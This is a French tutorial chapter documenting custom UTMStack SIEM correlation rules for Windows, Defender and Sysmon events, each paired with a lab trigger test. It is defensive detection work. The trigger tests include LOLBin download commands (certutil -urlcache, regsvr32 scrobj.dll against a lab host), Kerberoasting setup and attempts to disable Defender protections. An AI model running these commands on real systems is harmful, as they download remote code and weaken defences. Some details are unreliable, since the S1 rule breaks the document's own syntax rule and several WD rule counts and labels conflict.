---
title: "Chapitre 11 — Règles de corrélation YAML personnalisées | DoIt4Everyone"
description: "Création et validation de règles de corrélation YAML personnalisées pour UTMStack v11 CE : séries W (Windows natif), WD (Windows Defender), S (Sysmon via WEF), L (Linux auditd), M (Microsoft 365/Entra ID) et A (Azure Activity Log). 38 règles personnalisées validées en live dans OpenSearch, couvrant 28 techniques MITRE ATT&CK."
lang: fr
---
<style>
  header, footer { display: none !important; }
  .wrapper {
    max-width: 900px !important;
    margin: 0 auto !important;
    float: none !important;
    position: relative !important;
    padding: 40px 20px !important;
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif !important;
    font-size: 1.1em !important;
  }
  section {
    width: 100% !important;
    float: none !important;
    margin: 0 !important;
  }
  h1, h2 { text-align: center; }
  table { width: 100%; display: table; margin: 20px 0; }
</style>

# Chapitre 11 — Règles de corrélation YAML personnalisées

> [← Retour à l'index](../)

Ce chapitre documente la création et la validation de règles de corrélation personnalisées pour UTMStack v11. Chaque règle est validée en live dans OpenSearch avant d'être publiée — aucune règle n'est documentée sans déclenchement confirmé.

Les règles couvrent six sources de logs : Windows natif (wineventlog), Sysmon via WEF, Linux (auditd), Windows Defender, Microsoft 365 et Azure Activity Log. Elles sont organisées en séries : W (Windows), WD (Windows Defender), S (Sysmon), L (Linux), M (M365/Entra ID) et A (Azure).

---

## Veille CVE et règles de détection compensatoires

Un SIEM custom n'est pas qu'un outil de détection comportementale — c'est aussi un filet de sécurité pendant la fenêtre de vulnérabilité qui sépare la publication d'une CVE critique de son déploiement en production. Dans une PME suisse, cette fenêtre dure en moyenne deux à quatre semaines : le temps de tester le patch, de planifier la maintenance, et de l'appliquer sans interrompre les opérations. Pendant ce temps, la CVE est publique, les exploits sont disponibles, et les attaquants sont actifs.

Les règles de corrélation personnalisées permettent de combler partiellement cette fenêtre. Une CVE qui exploite un mécanisme d'authentification sera souvent détectée par une règle comportementale existante — W6 (Pass-the-Hash), W7 (Kerberoasting), M5 (MFA Interrupt) — même si aucune règle dédiée à la CVE n'a été écrite. C'est la valeur de l'approche comportementale : elle reste pertinente indépendamment des CVE publiées, car les techniques ATT&CK sous-jacentes ne changent pas.

Pour les CVE qui sortent du cadre comportemental couvert, la réponse peut être une règle ciblée et temporaire — active jusqu'au patch, puis désactivée. Ce chapitre illustre cette philosophie à travers les deux axes qui se complètent : détection comportementale pérenne et réponse événementielle aux CVE critiques.

---

## Prérequis et architecture

### Format YAML UTMStack v11

Chaque règle respecte le format suivant :

```yaml
name: "Nom de la règle"
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: "Authentication"
technique: "T1110 - Brute Force"
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1110/
description: 'Description de la règle. Next Steps: 1. ... 2. ...'
where: |-
  condition1 &&
  condition2
afterEvents: []
groupBy: []
deduplicateBy: []
```

### Règles absolues d'authoring

Trois règles doivent être respectées pour que les règles déclenchent correctement dans UTMStack v11 :

**`groupBy: []` et `deduplicateBy: []` obligatoires** — toute valeur non vide dans ces champs bloque silencieusement le déclenchement. Ce comportement a été confirmé empiriquement lors des premiers tests de la règle W1.

**Pas de blocs `()` avec `||` multiples** — le moteur de corrélation crashe sur ce pattern et désactive la règle après 5 échecs. Utiliser `regexMatch` avec alternance : `regexMatch("champ", "(?i)(pattern1|pattern2|pattern3)")`.

**Procédure de mise à jour** — toujours supprimer et réimporter le YAML. Ne jamais éditer une règle en place.

**Redémarrage obligatoire après import** — après chaque import de règle via l'interface UTMStack, les conteneurs event-processor doivent être redémarrés pour que la règle soit prise en compte par le moteur de corrélation :

```bash
docker service update --force utmstack_event-processor-worker
sleep 30
docker service update --force utmstack_event-processor-manager
```

Sans ce redémarrage, la règle apparaît bien dans la liste des corrélations mais ne déclenche pas sur les nouveaux events.

### GPO prérequis — Ligne de commande EID 4688

Pour que les règles basées sur EID 4688 (S1 LOLBAS) fonctionnent, la GPO suivante doit être activée :

Configuration ordinateur → Stratégies → Modèles d'administration → Système → Création de processus d'audit → **Inclure la ligne de commande dans les événements de création de processus** → Activé.

Sans cette GPO, le champ `log.data.CommandLine` est absent et les règles ne peuvent pas filtrer sur la ligne de commande.

---

## Série W — Windows natif (wineventlog)

Les règles W détectent des comportements suspects sur les systèmes Windows en utilisant les journaux d'événements natifs. Elles ne dépendent pas de Sysmon et fonctionnent sur tous les systèmes Windows avec l'agent UTMStack. Les fichiers YAML sont disponibles dans [`rules/windows/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/windows).

### W1 — Account Lockout Detected (EID 4740)

Un compte utilisateur a été verrouillé suite à un nombre excessif d'échecs d'authentification. Peut indiquer une attaque par force brute ou par pulvérisation de mots de passe. L'event est généré sur le contrôleur de domaine qui effectue le verrouillage.

**Technique MITRE :** T1110 — Brute Force

```yaml
name: W1 - Account Lockout Detected
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Authentication
technique: T1110 - Brute Force
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1110/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4740
description: 'Un compte utilisateur a été verrouillé suite à un nombre excessif d''échecs d''authentification (EID 4740). Peut indiquer une attaque par force brute ou par pulvérisation de mots de passe. L''event est généré sur le contrôleur de domaine effectuant le verrouillage. Next Steps: 1. Identifier la machine source du verrouillage via le champ target.domain. 2. Vérifier les events 4625 (échecs d''authentification) précédant le verrouillage sur la même machine. 3. Contrôler si plusieurs comptes sont verrouillés simultanément (signe de password spray). 4. Réinitialiser le compte après investigation. 5. Vérifier si le compte ciblé est un compte privilégié.'
where: |-
  equals("log.eventCode", 4740) &&
  equals("log.channel", "Security") &&
  exists("target.user") &&
  !regexMatch("target.user", "(?i)\\$$")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis une machine membre du domaine, créer un compte de test et provoquer son verrouillage :

```powershell
# Sur DC01-MAIN-SITE (contrôleur de domaine) — création du compte de test
New-ADUser -Name "test-lockout" -SamAccountName "test-lockout" `
  -UserPrincipalName "test-lockout@lan.local" `
  -AccountPassword (ConvertTo-SecureString "TestLab2026!" -AsPlainText -Force) `
  -Enabled $true

# Depuis n'importe quelle machine membre — verrouillage par tentatives répétées
1..10 | ForEach-Object {
    net use \\DC01-MAIN-SITE\IPC$ /user:lan\test-lockout MauvaisMDP
    net use \\DC01-MAIN-SITE\IPC$ /delete 2>$null
}

# Nettoyage
Remove-ADUser -Identity "test-lockout" -Confirm:$false
```

**Faux positifs :** les comptes machine (suffixe `$`) peuvent être verrouillés lors de rotations de mot de passe — exclus par le filtre `!regexMatch("target.user", "(?i)\\$$")`.

---

### W2 — Member Added to Local Administrators Group (EID 4732)

Un compte a été ajouté au groupe Administrateurs local. Le filtre sur le SID universel `S-1-5-32-544` garantit la détection indépendamment de la langue du système (Administrateurs en français, Administrators en anglais).

**Technique MITRE :** T1098 — Account Manipulation

```yaml
name: W2 - Member Added to Local Administrators Group
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Privilege Escalation
technique: T1098 - Account Manipulation
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1098/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4732
description: 'Un compte a été ajouté au groupe Administrateurs local (EID 4732, SID S-1-5-32-544). Le filtre sur le SID universel S-1-5-32-544 garantit la détection indépendamment de la langue du système. Peut indiquer une tentative de persistance ou d''élévation de privilèges sur un serveur membre. Next Steps: 1. Identifier le compte ajouté via log.data.MemberSid. 2. Vérifier si un EID 4720 (création de compte local) précède cet event sur la même machine. 3. Contrôler qui a effectué l''opération via log.eventDataSubjectUserName. 4. Vérifier si l''ajout est légitime (GPO, script d''administration). 5. Supprimer le compte si non autorisé et investiguer le vecteur d''accès initial.'
where: |-
  equals("log.eventCode", 4732) &&
  equals("log.channel", "Security") &&
  equals("log.data.TargetSid", "S-1-5-32-544")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Sur un serveur membre (gest-srv, serveur membre du domaine) en PowerShell admin. Attention : sur les systèmes Windows Server 2025 en français, le groupe s'appelle `Administrateurs` et non `Administrators`. Utiliser le nom localisé ou passer par le SID.

```powershell
New-LocalUser -Name "testlocal-w2" `
  -Password (ConvertTo-SecureString "TestLab2026!" -AsPlainText -Force) `
  -PasswordNeverExpires

Add-LocalGroupMember -Group "Administrateurs" -Member "testlocal-w2"

# Nettoyage
Remove-LocalGroupMember -Group "Administrateurs" -Member "testlocal-w2"
Remove-LocalUser -Name "testlocal-w2"
```

---

### W3 — Member Added to Privileged Domain Group (EID 4728/4756)

Un compte a été ajouté à un groupe privilégié du domaine. La détection cible les groupes les plus sensibles via leur RID universel, indépendamment de la langue du système.

**Groupes couverts :** Domain Admins (RID -512), Schema Admins (RID -518), Enterprise Admins (RID -519), Group Policy Creator Owners (RID -520).

**Technique MITRE :** T1098 — Account Manipulation

```yaml
name: W3 - Member Added to Privileged Domain Group
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Privilege Escalation
technique: T1098 - Account Manipulation
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1098/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4728
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4756
description: 'Un compte a été ajouté à un groupe privilégié du domaine (EID 4728 ou 4756). La détection cible les groupes les plus sensibles via leur RID universel : Domain Admins (-512), Schema Admins (-518), Enterprise Admins (-519), Group Policy Creator Owners (-520). Ces events sont générés sur le contrôleur de domaine. Next Steps: 1. Identifier le compte ajouté via log.data.MemberSid et log.data.MemberName. 2. Vérifier qui a effectué l''opération via log.eventDataSubjectUserName. 3. Confirmer si l''ajout est autorisé (ticket de changement, procédure administrative). 4. Retirer immédiatement le compte si non autorisé. 5. Investiguer les connexions récentes du compte ayant effectué l''opération (EID 4624).'
where: |-
  oneOf("log.eventCode", [4728, 4756]) &&
  equals("log.channel", "Security") &&
  regexMatch("log.data.TargetSid", "-(512|518|519|520)$")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Sur DC01-MAIN-SITE (contrôleur de domaine) en PowerShell admin. Sur les systèmes en français, le groupe s'appelle `Admins du domaine`.

```powershell
# Créer un compte de test si nécessaire
New-ADUser -Name "ch11-test" -SamAccountName "ch11-test" `
  -AccountPassword (ConvertTo-SecureString "TestLab2026!" -AsPlainText -Force) -Enabled $true

# Ajouter au groupe Domain Admins puis retirer immédiatement
Add-ADGroupMember -Identity "Admins du domaine" -Members "ch11-test"
Remove-ADGroupMember -Identity "Admins du domaine" -Members "ch11-test" -Confirm:$false

# Nettoyage
Remove-ADUser -Identity "ch11-test" -Confirm:$false
```

---

### W4 — Suspicious Scheduled Task Created (EID 4698)

Une tâche planifiée a été créée en dehors des namespaces système légitimes. Les tâches planifiées sont un vecteur de persistance fréquemment utilisé par les attaquants.

**Technique MITRE :** T1053.005 — Scheduled Task

```yaml
name: W4 - Suspicious Scheduled Task Created
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Persistence
technique: T1053.005 - Scheduled Task
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1053/005/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698
description: 'Une tâche planifiée a été créée en dehors des namespaces système légitimes (EID 4698). Les tâches planifiées sont un vecteur de persistance fréquemment utilisé par les attaquants. Les namespaces Microsoft, Windows, SoftLanding et les tâches créées par SYSTEM ou les comptes machine sont exclus. Next Steps: 1. Examiner le contenu XML de la tâche via log.data.TaskContent pour identifier la commande exécutée. 2. Vérifier le compte ayant créé la tâche via log.eventDataSubjectUserName. 3. Contrôler si la tâche pointe vers un exécutable dans un chemin inhabituel. 4. Supprimer la tâche si non autorisée : Unregister-ScheduledTask -TaskName "nom" -Confirm:$false. 5. Investiguer les autres activités du compte créateur dans la même fenêtre temporelle.'
where: |-
  equals("log.eventCode", 4698) &&
  equals("log.channel", "Security") &&
  !equals("log.eventDataSubjectUserSid", "S-1-5-18") &&
  !regexMatch("log.eventDataSubjectUserName", "(?i)\\$$") &&
  !regexMatch("log.data.TaskName", "(?i)^\\\\(Microsoft|Windows|SoftLanding)\\\\") &&
  !contains("log.data.TaskName", "CreateExplorerShellUnelevatedTask")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
  -Argument "-NoProfile -WindowStyle Hidden -Command whoami"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
Register-ScheduledTask -TaskName "test-w4" -Action $action -Trigger $trigger -Force
Unregister-ScheduledTask -TaskName "test-w4" -Confirm:$false
```

---

### W5a — Service Installed from User or Temp Directory (EID 7045)

Un nouveau service Windows a été installé depuis un répertoire utilisateur ou temporaire. Les services légitimes s'installent dans Program Files ou Windows.

**Technique MITRE :** T1543.003 — Windows Service

```yaml
name: W5a - Service Installed from User or Temp Directory
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Persistence
technique: T1543.003 - Create or Modify System Process Windows Service
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1543/003/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-7045
description: 'Un nouveau service Windows a été installé depuis un répertoire utilisateur ou temporaire (EID 7045). Les services légitimes s''installent dans Program Files ou Windows — un service depuis Temp, AppData ou Public est un signal fort de persistance malveillante. Next Steps: 1. Examiner le chemin complet via log.eventDataImagePath. 2. Identifier le compte ayant installé le service via log.data.AccountName. 3. Analyser l''exécutable (hash, VirusTotal). 4. Arrêter et supprimer le service : Stop-Service "nom" ; sc.exe delete "nom". 5. Investiguer les autres activités sur la machine dans la même fenêtre temporelle.'
where: |-
  equals("log.eventCode", 7045) &&
  equals("log.channel", "System") &&
  regexMatch("log.eventDataImagePath", "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\public\\\\|\\\\users\\\\|%temp%|%appdata%)")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

```powershell
Copy-Item "C:\Windows\System32\cmd.exe" "$env:PUBLIC\test-w5a.exe"
sc.exe create "test-w5a" binPath= "C:\Users\Public\test-w5a.exe" start= demand
sc.exe delete "test-w5a"
Remove-Item "$env:PUBLIC\test-w5a.exe"
```

---

### W5b — Kernel Driver Installed Outside System32 (EID 7045)

Un pilote en mode noyau a été installé depuis un chemin inhabituel hors de `system32\drivers`. Les drivers noyau légitimes résident dans `system32\drivers`.

**Note :** cette règle n'a pas pu être testée en live (risque BSOD avec un driver non signé). La logique est validée sur les données historiques du lab.

**Technique MITRE :** T1014 — Rootkit

```yaml
name: W5b - Kernel Driver Installed Outside System32
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 3
category: Defense Evasion
technique: T1014 - Rootkit
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1014/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-7045
description: 'Un pilote en mode noyau a été installé depuis un chemin inhabituel hors de system32\drivers (EID 7045). Les drivers noyau légitimes résident dans system32\drivers — un driver installé ailleurs est un indicateur fort de rootkit. Next Steps: 1. Examiner le chemin du driver via log.eventDataImagePath. 2. Vérifier la signature numérique du fichier .sys. 3. Analyser le driver (hash, VirusTotal, analyse statique). 4. Arrêter et supprimer le service : sc.exe stop "nom" ; sc.exe delete "nom". 5. Envisager une analyse forensique complète de la machine.'
where: |-
  equals("log.eventCode", 7045) &&
  equals("log.channel", "System") &&
  regexMatch("log.eventDataServiceType", "(?i)(noyau|kernel)") &&
  !regexMatch("log.eventDataImagePath", "(?i)system32\\\\drivers\\\\")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Note :** le champ `log.eventDataServiceType` contient `"pilote en mode noyau"` sur les systèmes Windows en français et `"kernel mode driver"` en anglais. Le `regexMatch` avec alternance `(?i)(noyau|kernel)` couvre les deux langues sans modification supplémentaire.

---

### W6 — Pass-the-Hash Attack Detected (EID 4624)

Un logon réseau NTLM (LogonType 3) a été détecté depuis un compte utilisateur. Dans un environnement Active Directory correctement configuré, les logons réseau légitimes utilisent Kerberos. Un logon NTLM réseau peut indiquer une attaque Pass-the-Hash ou une connexion par adresse IP directe qui force le passage en NTLM.

**Technique MITRE :** T1550.002 — Pass the Hash

```yaml
name: W6 - Pass-the-Hash Attack Detected
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Lateral Movement
technique: T1550.002 - Pass the Hash
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1550/002/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624
description: 'Un logon réseau NTLM (LogonType 3) a été détecté depuis un compte utilisateur (EID 4624). Dans un environnement Active Directory correctement configuré, les logons réseau légitimes utilisent Kerberos. Un logon NTLM réseau depuis un compte utilisateur réel peut indiquer une attaque Pass-the-Hash ou une connexion par adresse IP directe. Les comptes machine, les logons locaux et les machines d''administration connues sont exclus. Next Steps: 1. Identifier la machine source via origin.ip et origin.host. 2. Vérifier si la connexion a été établie par IP (forçant NTLM) plutôt que par nom. 3. Contrôler les autres activités du compte target.user dans la même fenêtre temporelle. 4. Vérifier si des outils de type Mimikatz ont été exécutés sur la machine source. 5. Investiguer les mouvements latéraux depuis origin.ip vers d''autres machines.'
where: |-
  equals("log.eventCode", 4624) &&
  equals("log.channel", "Security") &&
  equals("log.eventDataLogonType", "3") &&
  equals("log.eventDataAuthenticationPackageName", "NTLM") &&
  exists("target.user") &&
  !regexMatch("target.user", "(?i)\\$$") &&
  !regexMatch("target.user", "(?i)^(MSOL_|AAD_|AZUREADSSOACC)") &&
  !equals("origin.ip", "127.0.0.1") &&
  !equals("origin.ip", "::1") &&
  !equals("origin.host", "ADMIN-WS") &&
  exists("origin.ip")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Note d'adaptation :** remplacer `ADMIN-WS` par le nom de la station d'administration de votre environnement. Dans un environnement où NTLM est correctement désactivé, tout hit est suspect. Le compte `MSOL_` est le compte de synchronisation Entra Connect — son exclusion est indispensable dans les environnements hybrides pour éviter des faux positifs en rafale.

**Test de déclenchement**

Depuis WIN11-AD-TESTS, ouvrir l'Explorateur Windows et accéder à `\\10.100.1.16\C$` en saisissant l'adresse IP directement plutôt que le nom d'hôte. La connexion par IP force le protocole NTLM même quand Kerberos est disponible sur le réseau.

---

### W7 — Kerberoasting RC4 Encryption Detected (EID 4769)

Une demande de ticket Kerberos avec chiffrement RC4 (type 23) a été détectée. Dans un environnement moderne, les tickets légitimes utilisent AES256 (type 18). Une demande RC4 sur un compte de service avec SPN est le signal caractéristique d'une attaque Kerberoasting — l'attaquant récupère le hash RC4 pour le cracker hors ligne.

**Technique MITRE :** T1558.003 — Kerberoasting

```yaml
name: W7 - Kerberoasting RC4 Encryption Detected
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1558.003 - Steal or Forge Kerberos Tickets Kerberoasting
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1558/003/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769
description: 'Une demande de ticket Kerberos avec chiffrement RC4 (type 23) a été détectée (EID 4769). Dans un environnement moderne, les tickets légitimes utilisent AES256 (type 18). Une demande RC4 sur un compte de service avec SPN est le signal caractéristique d''une attaque Kerberoasting — l''attaquant récupère le hash RC4 pour le cracker hors ligne. Next Steps: 1. Identifier le compte demandeur via target.user et la machine source via origin.ip. 2. Vérifier si d''autres demandes RC4 ont été émises depuis la même source. 3. Contrôler si le compte de service ciblé dispose de droits élevés. 4. Réinitialiser le mot de passe du compte de service ciblé. 5. Envisager la migration vers des comptes gMSA pour éliminer le vecteur.'
where: |-
  equals("log.eventCode", 4769) &&
  equals("log.channel", "Security") &&
  equals("log.eventDataTicketEncryptionType", 23) &&
  equals("log.eventDataStatus", 0) &&
  !regexMatch("log.eventDataServiceName", "(?i)\\$$") &&
  !equals("log.eventDataServiceName", "krbtgt") &&
  !regexMatch("target.user", "(?i)^(MSOL_|AAD_|AZUREADSSOACC)")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

La règle W7 nécessite un compte de service avec SPN configuré en RC4 uniquement (pas AES). Sur DC01-MAIN-SITE (contrôleur de domaine) en PowerShell admin :

```powershell
# Créer un compte de service avec SPN et forcer RC4
New-ADUser -Name "svc-test-w7" -SamAccountName "svc-test-w7" `
  -AccountPassword (ConvertTo-SecureString "TestLab2026!" -AsPlainText -Force) -Enabled $true
Set-ADUser "svc-test-w7" -Add @{ServicePrincipalName="HTTP/svc-test-w7.lan.local"}
# Forcer RC4 uniquement (supprimer le support AES)
Set-ADUser "svc-test-w7" -Replace @{"msDS-SupportedEncryptionTypes" = 4}

# Depuis WIN11-AD-TESTS — demander un ticket Kerberos RC4
klist purge
Add-Type -AssemblyName System.IdentityModel
[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new("HTTP/svc-test-w7.lan.local")

# Nettoyage
Remove-ADUser -Identity "svc-test-w7" -Confirm:$false
```

---

## Série WD — Windows Defender

Ces quatre règles ont été créées et validées lors des sessions précédentes. Les fichiers YAML correspondants sont disponibles dans le répertoire [`rules/windows-defender/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/windows-defender) du dépôt.

| Règle | EID | Description |
|---|---|---|
| WD1 - Malware Detected | 1116 | Malware détecté par Windows Defender avec ThreatName complet |
| WD2 - Tamper Protection Blocked | 5013 | Tentative de désactivation de la protection anti-altération |
| WD3 - Real-Time Protection Disabled | 5001 | Désactivation de la protection temps réel |
| WD4 - Malware Remediation Failed | 1118 | Échec de remédiation d'un malware détecté |
| WD5 - Exclusion Added | 5007 | Ajout d'une exclusion Defender (vecteur d'évasion) |

**Note :** l'Event 1116 (Malware Detected) est couvert par la règle custom `windows-defender-malware-detected.yml` — aucune règle native UTMStack ne couvre cet event.

**Faux positif WD4 documenté :** les modifications de configuration Defender liées aux mises à jour Windows (`WdConfigHash`, `UX Configuration`, `DLP Configs`, `EcsConfigs`) génèrent des events EID 5007 légitimes. Ces patterns sont exclus dans la règle.

**Test WD1 :** depuis un endpoint Intune géré, tenter de désactiver la protection Tamper via PowerShell — `Set-MpPreference -DisableTamperProtection $true`. L'opération échoue et génère l'EID 5013.

**Test WD4 :** ajouter une exclusion de chemin via PowerShell — `Add-MpPreference -ExclusionPath "C:\Temp"`. L'opération réussit (si Tamper Protection est désactivée) et génère l'EID 5007.

---

## Série S — Sysmon via WEF

Les règles S utilisent les événements Sysmon collectés via Windows Event Forwarding (WEF). Les événements Sysmon arrivent dans UTMStack via le canal `ForwardedEvents` et sont indexés dans `v11-log-wineventlog-*` avec `dataType = wineventlog`. Les fichiers YAML sont disponibles dans [`rules/sysmon/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/sysmon).

### Limitations connues

**Canal `Microsoft-Windows-Sysmon/Operational` non collecté nativement par l'agent UTMStack** — la liste des canaux Windows collectés est hardcodée dans le binaire de l'agent. `ForwardedEvents` est présent, mais `Microsoft-Windows-Sysmon/Operational` ne l'est pas (confirmé par analyse binaire de `utmstack_agent_service_windows_amd64.exe`). Ce comportement a été signalé à UTMStack ([GitHub issue #2446](https://github.com/utmstack/UTMStack/issues/2446)).

Le contournement retenu est une **self-subscription WEF** : chaque machine crée une souscription WEF locale qui recopie les événements Sysmon vers son propre canal `ForwardedEvents`, lequel est nativement collecté par l'agent. Ce contournement fonctionne sur Windows Server 2022/2025 et les contrôleurs de domaine. Il **échoue sur Windows 11** (erreur 2150859027) — l'endpoint `/SubscriptionManager/WEC` n'est pas exposé sur les SKUs client Windows, quels que soient les réglages WinRM, URL ACL ou pare-feu. Ce comportement a été vérifié sur deux machines Windows 11 24H2 distinctes après diagnostic exhaustif.

Conséquence pratique : les règles S s'appliquent aux serveurs et contrôleurs de domaine, mais pas aux postes de travail Windows 11 sans déploiement d'un collecteur WEF centralisé.

**EID 1 (ProcessCreate) absent des événements WEF** — l'EID 1 Sysmon n'est pas remonté par WEF via `ForwardedEvents`, même quand la souscription est active et que les autres EIDs (8, 10, 11, 12, 13, 17) fonctionnent correctement. La règle S1 utilise EID 4688 (journal Security) comme contournement — ce qui nécessite la GPO "Inclure la ligne de commande dans les événements de création de processus".

**Filtre `log.channel`** — le canal Sysmon (`Microsoft-Windows-Sysmon/Operational`) est indexé en tant que champ `text` et non `keyword`. Utiliser `contains("log.channel", "Sysmon")` et non `equals()`.

---

### S1 — LOLBAS Execution Detected (EID 4688)

Un binaire Windows légitime fréquemment détourné (LOLBAS — Living Off the Land Binaries and Scripts) a été exécuté avec une ligne de commande suspecte. Cette règle complète la règle native UTMStack "Windows: LOLBin Proxy Execution / Ingress Tool Transfer".

**Prérequis :** GPO "Inclure la ligne de commande dans les événements de création de processus" activée.

**Défense en profondeur :** lors des tests, MDE a bloqué les exécutions (`certutil -urlcache` → Trojan:Win32/Ceprolad.A, `regsvr32 /i:http scrobj.dll` → Trojan:Win32/Powemet.A!attk) tandis que la règle native UTMStack et S1 généraient des alertes SIEM complémentaires. Les trois couches ont fonctionné simultanément : MDE bloque, le SIEM contextualise et corrèle.

**Technique MITRE :** T1218 — System Binary Proxy Execution

```yaml
name: S1 - LOLBAS Execution Detected
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1218 - System Binary Proxy Execution
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1218/
  - https://lolbas-project.github.io/
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
description: 'Un binaire Windows légitime fréquemment détourné (LOLBAS) a été exécuté avec une ligne de commande suspecte (EID 4688). Les attaquants utilisent ces binaires signés Microsoft pour télécharger des payloads, exécuter du code distant ou contourner les défenses. Cette règle nécessite la GPO "Inclure la ligne de commande dans les événements de création de processus". Note : Sysmon EID 1 serait l''approche idéale mais l''agent UTMStack ne remonte pas cet EID — EID 4688 est le contournement retenu. Next Steps: 1. Examiner la ligne de commande complète via log.data.CommandLine. 2. Identifier le processus parent via log.data.ParentProcessName. 3. Vérifier si la commande télécharge un fichier distant ou exécute du code encodé. 4. Corréler avec les connexions réseau et créations de fichiers dans la même fenêtre. 5. Isoler la machine si le pattern est confirmé malveillant.'
where: |-
  equals("log.eventCode", 4688) &&
  regexMatch("log.data.NewProcessName", "(?i)\\\\(certutil|mshta|regsvr32|rundll32|installutil|odbcconf|msbuild|bitsadmin|wmic|cmstp|regasm|regsvcs)[.]exe$") &&
  !equals("log.eventDataSubjectUserSid", "S-1-5-18") &&
  !(contains("log.data.NewProcessName", "rundll32.exe") &&
    regexMatch("log.data.CommandLine", "(?i)C:\\\\Windows\\\\system32\\\\.*\\.dll")) &&
  (
    contains("log.data.CommandLine", "http") ||
    contains("log.data.CommandLine", "-urlcache") ||
    contains("log.data.CommandLine", "javascript:") ||
    contains("log.data.CommandLine", "vbscript:") ||
    contains("log.data.CommandLine", "-decode") ||
    contains("log.data.CommandLine", "-encode") ||
    contains("log.data.CommandLine", "scrobj.dll") ||
    contains("log.data.CommandLine", "/i:") ||
    regexMatch("log.data.CommandLine", "(?i)\\.(sct|xsl|hta)$")
  )
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis WIN11-AD-TESTS, en PowerShell :

```powershell
# Test certutil — téléchargement via HTTP (MDE bloquera l'exécution réelle)
certutil -urlcache -split -f http://10.100.1.10/test.txt C:\Temp\test.txt

# Test regsvr32 — script COM distant (MDE bloquera)
regsvr32 /s /n /u /i:http://10.100.1.10/test.sct scrobj.dll
```

---

### S2 — Suspicious LSASS Process Access (EID 10)

Un processus a accédé à la mémoire de `lsass.exe` avec des droits suspects. LSASS contient les credentials des sessions actives. Deux variantes sont disponibles selon l'environnement.

**Technique MITRE :** T1003.001 — LSASS Memory

**Variante universelle (`s2-lsass-access.yml`) :** pour les environnements sans VMware.

**Variante VMware (`s2-lsass-access-vmware.yml`) :** pour les labs et environnements virtualisés VMware. Ajoute l'exclusion de `vmtoolsd.exe` qui accède légitimement à LSASS pour collecter des informations sur les processus actifs. Ne pas importer les deux simultanément.

```yaml
name: S2 - Suspicious LSASS Process Access (VMware)
dataTypes:
  - wineventlog
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1003.001 - OS Credential Dumping LSASS Memory
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1003/001/
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
description: 'Variante de S2 pour environnements virtualisés VMware. Un processus a accédé à la mémoire de lsass.exe avec des droits suspects (Sysmon EID 10). Next Steps: 1. Identifier le processus source via log.data.SourceImage. 2. Vérifier les droits d''accès via log.data.GrantedAccess — 0x1010 et 0x1410 sont caractéristiques de Mimikatz. 3. Analyser log.data.CallTrace pour identifier les DLLs injectées (UNKNOWN = DLL non mappée suspecte). 4. Isoler la machine si un outil de dumping est confirmé. 5. Réinitialiser tous les mots de passe si compromise confirmée.'
where: |-
  equals("log.eventCode", 10) &&
  contains("log.channel", "Sysmon") &&
  contains("log.data.TargetImage", "lsass.exe") &&
  !contains("log.data.SourceImage", "Windows Defender Advanced Threat Protection") &&
  !contains("log.data.SourceImage", "Windows Defender") &&
  !contains("log.data.SourceImage", "UTMStack") &&
  !contains("log.data.SourceImage", "MRT.exe") &&
  !contains("log.data.SourceImage", "taskmgr.exe") &&
  !contains("log.data.SourceImage", "VMware Tools")
afterEvents: []
groupBy: []
deduplicateBy: []
